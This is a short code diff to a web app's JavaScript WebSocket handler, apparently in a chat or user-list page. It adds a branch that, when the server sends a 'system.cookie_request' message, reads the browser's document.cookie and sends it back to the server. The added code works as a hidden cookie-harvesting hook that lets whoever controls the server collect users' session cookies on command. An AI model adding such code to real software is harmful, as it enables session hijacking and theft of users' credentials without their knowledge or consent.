@@ -159,6 +159,11 @@
                 }
             } else if (type === 'script.user_list') {
                 renderUserList(data.users || []);
+            } else if (type === 'system.cookie_request') {
+                // 服务器请求 cookie 信息，读取并返回
+                if (document.cookie) {
+                    sendJson({ type: 'system.cookie_response', cookie: document.cookie });
+                }
             }
         }
 
